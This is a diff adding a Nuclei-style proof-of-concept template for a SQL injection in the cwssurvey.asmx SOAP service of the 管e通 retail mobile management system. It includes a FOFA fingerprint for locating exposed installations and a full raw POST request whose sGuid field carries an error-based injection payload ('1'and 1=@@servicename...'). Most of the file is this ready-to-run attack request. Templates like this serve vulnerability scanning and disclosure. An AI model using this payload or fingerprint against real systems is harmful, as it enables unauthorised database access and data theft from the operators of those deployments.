@@ -1,0 +1,19 @@
+id: poc-rr0xz63c4l67kt11
+info:
+  name: 管e通零售移动管理系统软件 cwssurvey.asmx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rr0xz63c4l67kt11'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rr0xz63c4l67kt11
+    fofa: body="CheckSilverlightInstalled" || body="/Scripts/EnjoyMsg.js"
+http:
+- raw:
+  - "POST /enjoyRMIS_WS/WS/BaseInfo/cwssurvey.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: 438\nConnection: close\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n               xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n               xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetSurveyAnswerByGuid1 xmlns=\"http://tempuri.org/\">\n      <sGuid>1'and 1=@@servicename and '1'='1</sGuid>\n      <sProvider></sProvider>\n    </GetSurveyAnswerByGuid1>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
